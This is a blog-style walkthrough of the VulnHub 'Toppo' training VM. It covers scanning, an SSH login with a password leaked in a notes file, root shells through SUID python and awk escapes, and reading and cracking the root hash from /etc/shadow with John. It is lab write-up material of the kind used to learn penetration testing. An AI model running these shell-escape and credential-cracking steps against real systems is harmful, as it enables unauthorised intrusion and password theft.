---
title: "Toppo"
date: 2021-05-05T08:22:12+05:30
draft: false
toc: false
images:
tags:
  - VulnHub
---

## Toppo VulnHub Walkthrough

### Recon & Enumeration

- `sudo netdiscover -i eth0 -r 10.0.2.0/24` 
- Toppo - `10.0.2.6` 
- `sudo rustscan -a 10.0.2.6 -- -sS -A` 

```
10.0.2.6:22    => OpenSSH 6.7p1 
10.0.2.6:80    => Apache httpd 2.4.10 
10.0.2.6:111   => rpcbind 
10.0.2.6:39086 => RPC 
```
- `nikto -h 10.0.2.6` 
```
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 1925, size: 563f5cf714e80, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /package.json: Node.js package file found. It may contain sensitive information.
```

- `gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.6 -t 70 -x txt,php` 

```
/mail          (Status: 301) [Size: 303] [http://10.0.2.6/mail/]
/admin         (Status: 301) [Size: 304] [http://10.0.2.6/admin/]
/css           (Status: 301) [Size: 302] [http://10.0.2.6/css/]  
/manual        (Status: 301) [Size: 305] [http://10.0.2.6/manual/]
/js            (Status: 301) [Size: 301] [http://10.0.2.6/js/]    
/img           (Status: 301) [Size: 302] [http://10.0.2.6/img/]   
/vendor        (Status: 301) [Size: 305] [http://10.0.2.6/vendor/]
/LICENSE       (Status: 200) [Size: 1093] 
/server-status (Status: 403) [Size: 296] 
```

- `http://10.0.2.6/admin/notes.txt` 
```text
Note to myself :
I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer.
```
- The password used also has `ted` in it which could be username. 
- `ssh ted@10.0.2.6` => yes => `12345ted123` and we are logged in as `ted`! 
- `whoami` => `ted` 

### Privilege Escalation

- `find / -perm -4000 2>/dev/null` 
```
/sbin/mount.nfs
/usr/sbin/exim4
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/python2.7
/usr/bin/chsh
/usr/bin/at
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/passwd
/bin/su
/bin/umount
/bin/mount
```
- `/usr/bin/python2.7` has SUID bit set! 
- [GTFOBins](https://gtfobins.github.io/gtfobins/python/) 
- `/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` 
- It says: `sh: 0: Illegal option -p` so lets just remove `-p` and run it again. 
- `/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh")'` 
- And it worked! 
- `whoami && id`: 
```
root
uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
```
- `cd /root && ls -la` 
- `cat flag.txt` 
```
Congratulations! there is your flag: 0wnedlab{p4ssi0n_c0me_with_pract1ce} 
```

### Privilege Escalation 

I found another method for privilege escalation when I went through some writeups after rooting this VM. 

- `ssh ted@10.0.2.6` => yes => `12345ted123` 
- `cat /etc/sudoers` => `ted ALL=(ALL) NOPASSWD: /usr/bin/awk` 
- [GTFOBins](https://gtfobins.github.io/gtfobins/awk/) 
- `sudo awk 'BEGIN {system("/bin/sh")}'` 
- When we run this, we get: `sudo: command not found`. So lets try without `sudo`. 
- `awk 'BEGIN {system("/bin/sh")}'` 
- And we get root shell. 

### Post Exploitation 

- `cat /etc/shadow` 
```
root:$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:17636:0:99999:7:::
``` 
- `cat /etc/passwd` 
```
root:x:0:0:root:/root:/bin/bash
``` 
- On Kali VM, make a directory `toppo` and then 2 files inside named `passwd` and `shadow` and then paste the `root` user lines from above in them respectively. (`/etc/passwd` in `passwd` and `/etc/shadow` in `shadow`). 
- Open terminal and: `unshadow passwd shadow > crack.txt` 
- We can also use `hashid` for `root` hash which tells us the hash format is `SHA-512 Crypt [JtR Format: sha512crypt]`: 
- `hashid -j '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0'` 
- `john crack.txt` (will use default wordlist but that is enough in this case) 
	```
	test123   (root)
	``` 
- Or we can crack just the hash without unshadowing: 
- `echo '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0' > crack.txt` 
- `john --wordlist /usr/share/john/password.lst --format=sha512crypt crack.txt` 
- So the credentials for `root` user are: `root:test123` 

